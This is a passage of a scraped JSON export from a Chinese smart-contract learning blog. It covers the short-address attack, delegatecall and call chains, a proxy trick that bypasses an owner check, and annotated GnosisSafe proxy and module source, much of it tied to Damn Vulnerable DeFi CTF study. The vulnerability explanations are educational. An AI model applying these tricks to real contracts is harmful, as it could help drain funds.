a9059cbb000000000000000000000000146aed09cd9dea7a64de689c5d3ef73d2ee5ca000000000000000000000000000000000000000000000000000000000000000001 具体可以分解为3个部分： 4字节函数签名：a9059cbb to参数：000000000000000000000000146aed09cd9dea7a64de689c5d3ef73d2ee5ca00 amount参数：0000000000000000000000000000000000000000000000000000000000000001大家可能注意到，这个转账地址有点特殊：最后两个数字为0。 假如有个用户“不小心”忘记输入最后这两个0了怎么办？这样我们的输入就只有67个字节了。EVM是通过CALLDATALOAD指令从输入数据中获取函数参数的，因此它会先从后面的amount参数里“借”两个0来补足前面的地址参数。当它要加载amount参数的时候，发现位数不够，会在右边补0这篇*文章*写得挺好的。 参考链接WTF学院 慢雾拒绝服务攻击","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"基础漏洞","slug":"基础漏洞","permalink":"https://biyouqiuqiu.com/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"}]},{"title":"Wallet Mining","slug":"CTFS/damn defi/Wallet Mining","date":"2023-07-28T03:37:10.000Z","updated":"2023-07-28T03:37:10.000Z","comments":true,"path":"2023/07/28/CTFS/damn defi/Wallet Mining/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/28/CTFS/damn%20defi/Wallet%20Mining/","excerpt":"","text":"1. issue2. analysing3. solvinglink","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"多重delegatecall和call","slug":"Basic_Knowledge/solidity/多重delegatecall和call","date":"2023-07-26T01:47:15.000Z","updated":"2023-07-26T01:47:15.000Z","comments":true,"path":"2023/07/26/Basic_Knowledge/solidity/多重delegatecall和call/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/26/Basic_Knowledge/solidity/%E5%A4%9A%E9%87%8Ddelegatecall%E5%92%8Ccall/","excerpt":"","text":"前言 📌 在做 damn defi的 backdoor挑战时，关于如何才能让 proxy合约给 hacker执行 approve授权操作，引发的深思。 我们知道，delegatecall是很特殊的调用方式，委托调用，代码是在逻辑合约 Proxy中执行。 如果我们通过这种方式执行 Caller --call--&gt; Proxy --delegatecall--&gt; Logic1 --delgatecall--&gt; Logic2 对 Logic2来说，如若其函数体呢有 msg.sender和 address(this)变量的话， 易知，此时的 msg.sender = address(Caller)， address(this) = address(Proxy) 📌 但是，如果在 delegatecall传递链上出现了call那么就很离谱了。 1. 多重传递按如下传递链进行函数的调用。 Caller --call--&gt; Proxy --delegatecall--&gt; Logic1 --delgatecall--&gt; Logic2 --call--&gt; Logic3 关键看 Logic3的 msg.sender和address(this)的变化。 2. 代码演示代码是不能正常运行的，不过不重要，我只要函数的调用过程即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// SPDX-License-Identifier: MITpragma solidity ^0.8.4;import &quot;hardhat/console.sol&quot;;/** Caller --call--&gt; Proxy --delegatecall--&gt; Logic1 --delgatecall--&gt; Logic2 --call--&gt; Logic3 request: find Logic3&#x27;s msg.sender is or not address(proxy)*/contract Caller&#123; address public proxy; constructor(address proxy_)&#123; proxy = proxy_; &#125; function delegatecall_approve(address _logic2, address _logic3) external returns(bool , address) &#123; console.log(&quot;Caller_address= &quot;, address(this)); (bool success , bytes memory data) = proxy.call(abi.encodeWithSignature(&quot;funLogic1(address,address)&quot;, _logic2, _logic3)); return (success, abi.decode(data,(address))); &#125;&#125;contract Proxy &#123; address public implementation; constructor(address implementation_)&#123; implementation = implementation_; &#125; fallback() external payable &#123; _delegate(); &#125; function _delegate() public &#123; address _implementation; console.log(&quot;Proxy_address= &quot;, address(this)); assembly &#123; _implementation := sload(0) calldatacopy(0, 0, calldatasize()) let result := delegatecall(gas(), _implementation, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) switch result case 0 &#123; revert(0, returndatasize()) &#125; default &#123; return(0, returndatasize()) &#125; &#125; &#125;&#125;contract Logic1 &#123; address public implementation; function funLogic1(address _logic2, address _logic3) external &#123; console.log(&quot;Logic1_msg.sender= &quot;, msg.sender); console.log(&quot;Logic1_address= &quot;, address(this)); _logic2.delegatecall(abi.encodeWithSignature(&quot;funLogic2(address)&quot;,_logic3)); &#125;&#125;contract Logic2 &#123; address public implementation; function funLogic2(address _logic3) external &#123; console.log(&quot;Logic2_msg.sender= &quot;, msg.sender); console.log(&quot;Logic2_address= &quot;, address(this)); _logic3.call(abi.encodeWithSignature(&quot;funLogic3()&quot;)); &#125;&#125;contract Logic3 &#123; address public implementation; function funLogic3() external &#123; console.log(&quot;Logic3_msg.sender= &quot;, msg.sender); console.log(&quot;Logic3_address= &quot;, address(this)); &#125;&#125; 3. 运行结果 📌 由结果不难看出，对 Logic3来说，ta 的调用者已成为了 Proxy合约，且address(this)也是ta本合约的地址了，我之前做题的时候想破脑袋都不知道怎么做到让 代理合约给 Hack 合约授权，因为我最开始认为，在 Logic2中执行 call，相对于Logic3来说 调用者应该是 Logic2才对，想了一天实在受不了了，只能实践出真知了。md。。。。结果真的是出乎我的认知。","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"}]},{"title":"proxy_随笔1","slug":"Basic_Knowledge/solidity/proxy_随笔1","date":"2023-07-25T01:47:10.000Z","updated":"2023-07-25T01:47:10.000Z","comments":true,"path":"2023/07/25/Basic_Knowledge/solidity/proxy_随笔1/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/25/Basic_Knowledge/solidity/proxy_%E9%9A%8F%E7%AC%941/","excerpt":"","text":"delegatecall关键字在代理合约中的妙用 就感觉很很神奇~ 逻辑合约12345678910111213141516171819202122232425contract Logic &#123; address owner; uint public a = 8; constructor() &#123; owner = msg.sender; &#125; // 0x069265cd function increate() external &#123; require(owner == address(0), &quot;owner != address(0)&quot;); a++; &#125; function calSelector() external returns (bytes4 selector, bytes memory data) &#123; selector = Logic.increate.selector; data = abi.encodeWithSignature(&quot;getOwner()&quot;); &#125; // 0x893d20e8 function getOwner() external returns(address) &#123; a = 100; return owner; &#125;&#125; 在 Logic 中如果你想调用 increate函数，显示是不可能的，该断言限制了该合约自己调用该方法。但是如果通过 delegatecall来调用就不一样了，代理合约可以自己设置一个同名的变量，并令其等于 address(0) 。这样一来逻辑合约就可以调用此函数了。 代理合约12345678910111213141516171819contract Proxy &#123; address public owner; uint public a; Logic logic; constructor(address _logic) &#123; logic = Logic(_logic); &#125; function delegatecall(bytes memory data) public returns (bool, bytes memory ) &#123; (bool success, bytes memory _data) = address(logic).delegatecall(data); return (success, _data); &#125; function increate() external &#123; a = 222; &#125;&#125; 运行结果 可以看到我们成功调用了increate函数。 此收获来自 damn defi backdoor。","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"proxy","slug":"Basic-Knowledge/proxy","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/proxy/"}],"tags":[{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"}]},{"title":"解读GnosisSafe_es","slug":"DEFI/gnosis/解读GnosisSafe_proxies","date":"2023-07-24T07:47:10.000Z","updated":"2023-07-24T07:47:10.000Z","comments":true,"path":"2023/07/24/DEFI/gnosis/解读GnosisSafe_proxies/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/24/DEFI/gnosis/%E8%A7%A3%E8%AF%BBGnosisSafe_proxies/","excerpt":"","text":"前言 最近在做 damn defi 靶场的时候，遇到了一些题涉及到 GnosisSafeProxy 相关知识的题。查缺补漏，先来学习学习 GnosisSafeProxy 合约。 解读GnosisSafeProxy.sol这是一个代理合约，一个构造器一个回调函数。 1. 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title IProxy - Helper interface to access masterCopy of the Proxy on-chain/// @author Richard Meissner - &lt;richard@gnosis.io&gt;interface IProxy &#123; function masterCopy() external view returns (address);&#125;/// @title GnosisSafeProxy - Generic proxy contract allows to execute all transactions applying the code of a master contract./// @author Stefan George - &lt;stefan@gnosis.io&gt;/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract GnosisSafeProxy &#123; // singleton always needs to be first declared variable, to ensure that it is at the same location in the contracts to which calls are delegated. // To reduce deployment costs this variable is internal and needs to be retrieved via `getStorageAt` address internal singleton; // 为了防止插槽冲突 /// @dev Constructor function sets address of singleton contract. /// @param _singleton Singleton address. constructor(address _singleton) &#123; require(_singleton != address(0), &quot;Invalid singleton address provided&quot;); singleton = _singleton; // 初始化singleton &#125; /// @dev Fallback function forwards all transactions and returns all received return data. fallback() external payable &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; let _singleton := and(sload(0), 0xffffffffffffffffffffffffffffffffffffffff) // 0xa619486e == keccak(&quot;masterCopy()&quot;). The value is right padded to 32-bytes with 0s if eq(calldataload(0), 0xa619486e00000000000000000000000000000000000000000000000000000000) &#123; mstore(0, _singleton) return(0, 0x20) &#125; calldatacopy(0, 0, calldatasize()) let success := delegatecall(gas(), _singleton, 0, calldatasize(), 0, 0) returndatacopy(0, 0, returndatasize()) if eq(success, 0) &#123; revert(0, returndatasize()) &#125; return(0, returndatasize()) &#125; &#125;&#125; 2. 解读回调函数，本质上是其他的代理合约差不多，采用了内联汇编的 delegatecall 操作码，调用的是 singleton合约的函数，效果作用在代理合约上。之前已经对代理合约有过一定的 学习 。 解读IProxyCreationCallback.sol1. 源码12345678910111213// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./GnosisSafeProxy.sol&quot;;interface IProxyCreationCallback &#123; function proxyCreated( GnosisSafeProxy proxy, address _singleton, bytes calldata initializer, uint256 saltNonce ) external;&#125; 2. 解读提供了一个用于创建代理合约的函数。 解读GnosisSafeProxyFactory.sol该函数继承了 12import &quot;./GnosisSafeProxy.sol&quot;;import &quot;./IProxyCreationCallback.sol&quot;; 1. 源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./GnosisSafeProxy.sol&quot;;import &quot;./IProxyCreationCallback.sol&quot;;/// @title Proxy Factory - Allows to create new proxy contact and execute a message call to the new proxy within one transaction./// @author Stefan George - &lt;stefan@gnosis.pm&gt;contract GnosisSafeProxyFactory &#123; event ProxyCreation(GnosisSafeProxy proxy, address singleton); /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction. /// @param singleton Address of singleton contract. /// @param data Payload for message call sent to new proxy contract. function createProxy(address singleton, bytes memory data) public returns (GnosisSafeProxy proxy) &#123; proxy = new GnosisSafeProxy(singleton); // 创建代理合约 if (data.length &gt; 0) // solhint-disable-next-line no-inline-assembly assembly &#123; if eq(call(gas(), proxy, 0, add(data, 0x20), mload(data), 0, 0), 0) &#123; revert(0, 0) &#125; &#125; emit ProxyCreation(proxy, singleton); &#125; /// @dev Allows to retrieve the runtime code of a deployed Proxy. This can be used to check that the expected Proxy was deployed. function proxyRuntimeCode() public pure returns (bytes memory) &#123; return type(GnosisSafeProxy).runtimeCode; &#125; /// @dev Allows to retrieve the creation code used for the Proxy deployment. With this it is easily possible to calculate predicted address. function proxyCreationCode() public pure returns (bytes memory) &#123; return type(GnosisSafeProxy).creationCode; &#125; /// @dev Allows to create new proxy contact using CREATE2 but it doesn&#x27;t run the initializer. /// This method is only meant as an utility to be called from other methods /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. function deployProxyWithNonce( address _singleton, bytes memory initializer, uint256 saltNonce ) internal returns (GnosisSafeProxy proxy) &#123; // If the initializer changes the proxy address should change too. Hashing the initializer data is cheaper than just concatinating it bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce)); bytes memory deploymentData = abi.encodePacked(type(GnosisSafeProxy).creationCode, uint256(uint160(_singleton))); // solhint-disable-next-line no-inline-assembly assembly &#123; proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt) &#125; require(address(proxy) != address(0), &quot;Create2 call failed&quot;); &#125; /// @dev Allows to create new proxy contact and execute a message call to the new proxy within one transaction. /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. function createProxyWithNonce( address _singleton, bytes memory initializer, uint256 saltNonce ) public returns (GnosisSafeProxy proxy) &#123; proxy = deployProxyWithNonce(_singleton, initializer, saltNonce); if (initializer.length &gt; 0) // solhint-disable-next-line no-inline-assembly assembly &#123; if eq(call(gas(), proxy, 0, add(initializer, 0x20), mload(initializer), 0, 0), 0) &#123; revert(0, 0) &#125; &#125; emit ProxyCreation(proxy, _singleton); &#125; /// @dev Allows to create new proxy contact, execute a message call to the new proxy and call a specified callback within one transaction /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. /// @param callback Callback that will be invoced after the new proxy contract has been successfully deployed and initialized. function createProxyWithCallback( address _singleton, bytes memory initializer, uint256 saltNonce, IProxyCreationCallback callback ) public returns (GnosisSafeProxy proxy) &#123; uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback))); proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback); if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce); &#125; /// @dev Allows to get the address for a new proxy contact created via `createProxyWithNonce` /// This method is only meant for address calculation purpose when you use an initializer that would revert, /// therefore the response is returned with a revert. When calling this method set `from` to the address of the proxy factory. /// @param _singleton Address of singleton contract. /// @param initializer Payload for message call sent to new proxy contract. /// @param saltNonce Nonce that will be used to generate the salt to calculate the address of the new proxy contract. function calculateCreateProxyWithNonceAddress( address _singleton, bytes calldata initializer, uint256 saltNonce ) external returns (GnosisSafeProxy proxy) &#123; proxy = deployProxyWithNonce(_singleton, initializer, saltNonce); revert(string(abi.encodePacked(proxy))); &#125;&#125; 2. 解读createProxy函数 其作用是创建一个代理合约对象，可以执行一次委托调用。 proxyRuntimeCode函数 AI解读： type(GnosisSafeProxy) 返回的是一个包含合约类型信息的对象，它可以用于访问合约的各种属性和方法。在这个代码片段中，使用了 type(GnosisSafeProxy).runtimeCode 来获取 GnosisSafeProxy 合约的运行时字节码。 运行时字节码是 Solidity 合约编译后的字节码，它包含了合约的代码和数据，并且已经经过了编译器和优化器的处理，可以直接在以太坊虚拟机（EVM）上执行。与源代码不同，运行时字节码是无法进行修改的，因此可以用于进行合约验证和安全审计。 在这个代码片段中，type(GnosisSafeProxy).runtimeCode 返回的是 GnosisSafeProxy 合约的运行时字节码。这个运行时字节码可以用于生成代理合约的 bytecode，从而创建新的 GnosisSafe 多签钱包合约实例。具体来说，这个运行时字节码包含了合约的代码和数据，以及合约的地址等元信息，可以用于部署合约和执行合约操作。 proxyCreationCode函数 返回 GnosisSafeProxy 的 Bytecode。 deployProxyWithNonce函数 使用create2的方式生成一个GnosisSafeProxy合约地址。 createProxyWithNonce函数 调用 deployProxyWithNonce 函数，创建一个新的代理合约地址，同时也可以执行一次委托调用。 createProxyWithCallback函数 根据 callback采用create2的方式计算出代理合约地址 calculateCreateProxyWithNonceAddress函数 根据 saltNonce采用create2的方式计算出代理合约地址。 最后，作者水平有限，有错请大佬们及时指出😁","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"gnosis","slug":"DEFI/gnosis","permalink":"https://biyouqiuqiu.com/categories/DEFI/gnosis/"}],"tags":[{"name":"gnosis","slug":"gnosis","permalink":"https://biyouqiuqiu.com/tags/gnosis/"},{"name":"proxiy","slug":"proxiy","permalink":"https://biyouqiuqiu.com/tags/proxiy/"}]},{"title":"解决数组内存浪费","slug":"Experience/tips/解决数组内存浪费","date":"2023-07-23T07:47:10.000Z","updated":"2023-07-23T07:47:10.000Z","comments":true,"path":"2023/07/23/Experience/tips/解决数组内存浪费/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/23/Experience/tips/%E8%A7%A3%E5%86%B3%E6%95%B0%E7%BB%84%E5%86%85%E5%AD%98%E6%B5%AA%E8%B4%B9/","excerpt":"","text":"前言当我们想用数组存储一些数据的时候，如果我们不知道数据的个数有多少的话，往往会开辟一个长度很大的数组，如果数据的个数很少，那么函数给我们返回的数组就会有很多未使用的空间，这样一来就会造成空间浪费，消耗更多的gas，而在区块链上gas也是钱呐，我们本着能省就省的理念。 所以最好能忽略掉那些未使用的空间。 使用内联汇编可以很好的解决这个问题。 方法123456789101112131415function setOwners() external pure returns (uint256 length, address[] memory temp) &#123; temp = new address[](6); uint ownerCount = 3; for (uint i; i &lt; 3; i++) &#123; temp[i] = address(0); &#125; assembly &#123; mstore(temp, ownerCount) length := mload(temp) &#125;&#125; 示例中，我们先开辟了一个长度为6的数组空间，而实际只操作了三个空间，我们需要返回数组的前三个元素即可。 效果演示","categories":[{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"},{"name":"tips","slug":"Experience/tips","permalink":"https://biyouqiuqiu.com/categories/Experience/tips/"}],"tags":[{"name":"内联汇编","slug":"内联汇编","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"}]},{"title":"解读GnosisSafe","slug":"DEFI/gnosis/GnosisSafe解读","date":"2023-07-23T05:47:10.000Z","updated":"2023-07-23T05:47:10.000Z","comments":true,"path":"2023/07/23/DEFI/gnosis/GnosisSafe解读/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/23/DEFI/gnosis/GnosisSafe%E8%A7%A3%E8%AF%BB/","excerpt":"","text":"前言 最近在做 damn defi 靶场的时候，遇到了一些题涉及到 GnosisSafe 相关知识的题。查缺补漏，先来学习学习 GnosisSafe 合约。 解读 GnosisSafe的父合约123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;./base/ModuleManager.sol&quot;;import &quot;./base/OwnerManager.sol&quot;;import &quot;./base/FallbackManager.sol&quot;;import &quot;./base/GuardManager.sol&quot;;import &quot;./common/EtherPaymentFallback.sol&quot;;import &quot;./common/Singleton.sol&quot;;import &quot;./common/SignatureDecoder.sol&quot;;import &quot;./common/SecuredTokenTransfer.sol&quot;;import &quot;./common/StorageAccessible.sol&quot;;import &quot;./interfaces/ISignatureValidator.sol&quot;;import &quot;./external/GnosisSafeMath.sol&quot;;/// @title Gnosis Safe - A multisignature wallet with support for confirmations using signed messages based on ERC191./// @author Stefan George - &lt;stefan@gnosis.io&gt;/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract GnosisSafe is EtherPaymentFallback, Singleton, ModuleManager, OwnerManager, SignatureDecoder, SecuredTokenTransfer, ISignatureValidatorConstants, FallbackManager, StorageAccessible, GuardManager&#123; 首先不难看出，该合约继承了一大堆合约，没办法只能先把他的一系列父合约看完。 1. EtherPaymentFallback.sol12345678910111213141516// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title EtherPaymentFallback - A contract that has a fallback to accept ether payments/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract EtherPaymentFallback &#123; // 接收到ETH时触发 event SafeReceived(address indexed sender, uint256 value); /// @dev Fallback function accepts Ether transactions. // 回调函数，用于接收ETH receive() external payable &#123; emit SafeReceived(msg.sender, msg.value); &#125;&#125; 该合约比较简单，只有一个用于接收ETH的回调函数，继承该合约后，子类可以接收其他合约转发的ETH。 2. Singleton.sol123456789101112// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title Singleton - Base for singleton contracts (should always be first super contract)/// This contract is tightly coupled to our proxy contract (see `proxies/GnosisSafeProxy.sol`)/// @author Richard Meissner - &lt;richard@gnosis.io&gt;contract Singleton &#123; // singleton always needs to be first declared variable, to ensure that it is at the same location as in the Proxy contract. // It should also always be ensured that the address is stored alone (uses a full word) address private singleton;&#125; 该合约就只有一个全局私有的地址变量。它是用于在代理模式中确保与逻辑合约中的变量位置保持一致。 3. ModuleManager.sol该合约又继承了两个合约，先看他的两个父合约。 3.1 SelfAuthorized.sol12345678910111213141516171819// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title SelfAuthorized - authorizes current contract to perform actions/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract SelfAuthorized &#123; // 执行判断语句，规定调用者地址 须为 本合约地址 function requireSelfCall() private view &#123; require(msg.sender == address(this), &quot;GS031&quot;); &#125; // 修饰器，调用 requireSelfCall 函数，被该修饰器修饰的函数的调用者须为该合约才可以调用 modifier authorized() &#123; // This is a function call as it minimized the bytecode size requireSelfCall(); _; &#125;&#125; 该合约主要是提供了一个修饰器，用于限制某些函数的调用者身份必须为本合约才行。 3.2 Executor.sol该合约继承了 Enum.sol , 先看 Enum.sol 3.2.1 Enum.sol12345678910// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;/// @title Enum - Collection of enums/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract Enum &#123; // 这是一个枚举类型的，定义了两种操作类型 call 和 delegatecall enum Operation &#123;Call, DelegateCall&#125;&#125; 这个枚举类型定义了两个操作类型，分别是 Call 和 DelegateCall。它们分别表示不同的智能合约调用方式： Call：表示通过合约地址直接调用另一个合约的函数。在这种调用方式下，调用者的上下文（例如合约地址和发送者地址）会被保留。 DelegateCall：表示通过合约地址委托调用另一个合约的函数。在这种调用方式下，调用者的上下文会被传递给被调用的合约，以便该合约可以访问调用者的状态和权限。 这个枚举类型常用于智能合约中的多签名钱包等场景中，以指定不同的操作类型。例如，多签名钱包可以使用 Call 操作来执行标准的转账操作，而使用 DelegateCall 操作来执行复杂的合约逻辑，以确保调用者的权限和状态得到保护。 在使用这个枚举类型时，可以通过以下方式来访问枚举值： 1Operation op = Operation.Call; 其中，op 是一个 Operation 类型的变量，它可以被赋值为 Call 或 DelegateCall。 看完 Enum.sol，我们在看会 Executor.sol 123456789101112131415161718192021222324252627282930pragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/Enum.sol&quot;;/// @title Executor - A contract that can execute transactions/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract Executor &#123; function execute( address to, // 目的地址 uint256 value, // msg.value bytes memory data, // 操作的ABI编码 Enum.Operation operation, // 这里是指 Enum合约中的两种操作方式，call 和 delegatecall uint256 txGas // gas ) internal returns (bool success) &#123; // 如果 operation 是委托调用则执行delegatecall，反之则执行call if (operation == Enum.Operation.DelegateCall) &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0) &#125; &#125; else &#123; // solhint-disable-next-line no-inline-assembly assembly &#123; success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0) &#125; &#125; &#125;&#125; ​ 该函数乍一看，使用了内联汇编中的 call 和 delegatecall，用于执行交易，比如函数的调用等。虽然两个参数是一样的，但是原理截然不同，可以看我写的一篇 文章 。 总之， 该合约给我们提供了两种执行方式，一种是直接调用 call另一种是委托调用 delegatecal。 看完 ModuleManager.sol的两个父合约，我们看回 ModuleManager.sol合约。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153// SPDX-License-Identifier: LGPL-3.0-onlypragma solidity &gt;=0.7.0 &lt;0.9.0;import &quot;../common/Enum.sol&quot;;import &quot;../common/SelfAuthorized.sol&quot;;import &quot;./Executor.sol&quot;;/// @title Module Manager - A contract that manages modules that can execute transactions via this contract/// @author Stefan George - &lt;stefan@gnosis.pm&gt;/// @author Richard Meissner - &lt;richard@gnosis.pm&gt;contract ModuleManager is SelfAuthorized, Executor &#123; event EnabledModule(address module); event DisabledModule(address module); event ExecutionFromModuleSuccess(address indexed module); event ExecutionFromModuleFailure(address indexed module); // address(0x1) = 0x0000000000000000000000000000000000000001 address internal constant SENTINEL_MODULES = address(0x1); mapping(address =&gt; address) internal modules; // 设置模块 /** 该函数可以简单理解为, 使用委托调用的方式 调用 to 中的函数 (data为函数的ABI编码) */ function setupModules(address to, bytes memory data) internal &#123; // 判断 SENTINEL_MODULES 是否被执行过 require(modules[SENTINEL_MODULES] == address(0), &quot;GS100&quot;); // 将 SENTINEL_MODULES 放入映射中，代表操作已被执行，将不能调用该函数 modules[SENTINEL_MODULES] = SENTINEL_MODULES; // 目的地址不能是 0 地址 if (to != address(0)) // Setup has to complete successfully or transaction fails. require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), &quot;GS000&quot;); &#125; /// @dev Allows to add a module to the whitelist. /// This can only be done via a Safe transaction. /// @notice Enables the module `module` for the Safe. /// @param module Module to be whitelisted. function enableModule(address module) public authorized &#123; // Module address cannot be null or sentinel. require(module != address(0) &amp;&amp; module != SENTINEL_MODULES, &quot;GS101&quot;); // Module cannot be added twice. // 未给modules[module]赋值的情况下，modules[module] = address(0) require(modules[module] == address(0), &quot;GS102&quot;); // 表示 module 已经被添加过了，不是 address(0)了 modules[module] = modules[SENTINEL_MODULES]; // 重置 SENTINEL_MODULES 的映射 modules[SENTINEL_MODULES] = module; emit EnabledModule(module); &#125; /// @dev Allows to remove a module from the whitelist. /// This can only be done via a Safe transaction. /// @notice Disables the module `module` for the Safe. /// @param prevModule Module that pointed to the module to be removed in the linked list /// @param module Module to be removed. function disableModule(address prevModule, address module) public authorized &#123; // Validate module address and check that it corresponds to module index. require(module != address(0) &amp;&amp; module != SENTINEL_MODULES, &quot;GS101&quot;); // 验证 prevModule 是不是 module的前一个模块 require(modules[prevModule] == module, &quot;GS103&quot;); // 将 module现在的身份转交到 preModule上 modules[prevModule] = modules[module]; // 移除 module 的身份 modules[module] = address(0); emit DisabledModule(module); &#125; /// @dev Allows a Module to execute a Safe transaction without any further confirmations. // 允许模块执行安全事务，无需任何进一步确认 /// @param to Destination address of module transaction. /// @param value Ether value of module transaction. /// @param data Data payload of module transaction. /// @param operation Operation type of module transaction. /** 调用 Executor合约中的 execute函数，调用 to 中的一些操作 */ function execTransactionFromModule( address to, uint256 value, bytes memory data, Enum.Operation operation ) public virtual returns (bool success) &#123; // Only whitelisted modules are allowed. // 只有被添加到白名单才可以被执行 require(msg.sender != SENTINEL_MODULES &amp;&amp; modules[msg.sender] != address(0), &quot;GS104&quot;); // Execute transaction without further confirmations. success = execute(to, value, data, operation, gasleft()); if (success) emit ExecutionFromModuleSuccess(msg.sender); else emit ExecutionFromModuleFailure(msg.sender); &#125; /// @dev Allows a Module to execute a Safe transaction without any further confirmations and return data /// @param to Destination address of module transaction. /// @param value Ether value of module transaction. /// @param data Data payload of module transaction. /// @param operation Operation type of module transaction. /** 和 execTransactionFromModule 差不多只是多了个返回值returnData */ function execTransactionFromModuleReturnData( address to, uint256 value, bytes memory data, Enum.Operation operation ) public returns (bool success, bytes memory returnData) &#123; success = execTransactionFromModule(to, value, data, operation); // solhint-disable-next-line no-inline-assembly // 如下操作是为了得到 returnDate assembly &#123; // Load free memory location let ptr := mload(0x40) // We allocate memory for the return data by setting the free memory location to // current free memory location + data size + 32 bytes for data size value mstore(0x40, add(ptr, add(returndatasize(), 0x20))) // Store the size mstore(ptr, returndatasize()) // Store the data returndatacopy(add(ptr, 0x20), 0, returndatasize()) // Point the return data to the correct memory location returnData := ptr &#125; &#125; /// @dev Returns if an module is enabled /// @return True if the module is enabled /** 判断 该module 是否被添加到白名单之中 */ function isModuleEnabled(address module) public view returns (bool) &#123; return SENTINEL_MODULES != module &amp;&amp; modules[module] != address(0); &#125; /// @dev Returns array of modules. /// @param start Start of the page. /// @param pageSize Maximum number of modules that should be returned. /// @return array Array of modules. /// @return next Start of the next page. /** 得到一个模块的映射链 */ function getModulesPaginated(address start, uint256 pageSize) external view returns (address[] memory array, address next) &#123; // Init array with max page size array = new address[](pageSize); // Populate return array uint256 moduleCount = 0; address currentModule = modules[start]; while (currentModule != address(0x0) &amp;&amp; currentModule != SENTINEL_MODULES &amp;&amp; moduleCount &lt; pageSize) &#123; array[moduleCount] = currentModule; currentModule = modules[currentModule]; moduleCount++; &#125; next = currentModule; // Set correct size of returned array // solhint-disable-next-line no-inline-assembly assembly &#123; mstore(array, moduleCount) &#125; &#125;&#125; 解读 enableModule函数： 将一个模块加入白名单，查看这个函数的逻辑可以发现，它将原哨兵模块（SENTINEL_MODULES） 